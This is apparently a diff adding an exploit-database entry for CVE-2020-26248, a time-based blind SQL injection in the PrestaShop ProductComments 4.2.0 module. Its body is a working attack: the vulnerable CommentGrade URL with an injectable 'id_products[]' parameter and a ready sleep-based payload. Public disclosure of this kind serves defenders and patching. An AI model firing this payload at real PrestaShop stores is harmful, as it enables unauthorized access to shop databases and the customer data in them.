@@ -1,0 +1,14 @@
+​# Exploit Title: PrestaShop ProductComments 4.2.0 - 'id_products' Time Based Blind SQL Injection
+# Date: 2020-12-15
+# Exploit Author: Frederic ADAM
+# Author contact: contact@fadam.eu
+# Vendor Homepage: https://www.prestashop.com
+# Software Link: https://github.com/PrestaShop/productcomments
+# Version: 4.2.0
+# Tested on: Debian 10
+# CVE : CVE-2020-26248
+
+http://localhost/index.php?fc=module&module=productcomments&controller=CommentGrade&id_products%5B%5D=[SQL]
+
+Example:
+http://localhost/index.php?fc=module&module=productcomments&controller=CommentGrade&id_products%5B%5D=(select*from(select(sleep(2)))a)
